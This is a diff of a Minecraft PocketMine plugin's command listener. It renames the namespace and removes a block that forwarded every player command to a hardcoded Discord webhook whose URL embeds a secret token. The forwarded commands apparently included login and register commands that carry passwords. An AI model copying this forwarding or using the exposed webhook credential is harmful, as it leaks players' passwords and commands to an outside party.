@@ -1,10 +1,10 @@
 <?php
 
-namespace cmdsnooper;
+namespace ClickedTran\CMDSnooper;
 
 use pocketmine\event\Listener;
 use pocketmine\event\server\CommandEvent;
-use cmdsnooper\CmdSnooper;
+use ClickedTran\CMDSnooper\CMDSnooper;
 use pocketmine\player\Player;
 
 use CortexPE\DiscordWebhookAPI\Message;
@@ -24,14 +24,6 @@ class EventListener implements Listener {
 	public function onCmnd(CommandEvent $event): void{
 	  $sender = $event->getSender();
 		$msg = $event->getCommand();
-		if($this->getPlugin()->setting->get("Discord") == "true"){
-		  if($sender instanceof Player){
-		   $discord = new Webhook("https://discord.com/api/webhooks/1159487002174046248/OnT56YIxLOTUKak1ZkbTvsHxjdZFHW1PAii6t17b9qBlwAeX2Jh62w6IWQqibJYXIBrF");
-		   $message = new Message();
-		   $message->setContent("Player ".$sender->getName() . " -> /".$msg);
-		   $discord->send($message);
-		  }
-		}
 		if($this->getPlugin()->setting->get("Console.Logger") == "true") {
 		  if($sender instanceof Player){
 		   if($msg[0] == "login" or $msg[0] == "log" or $msg[0] == "register" or $msg[0] == "reg"){
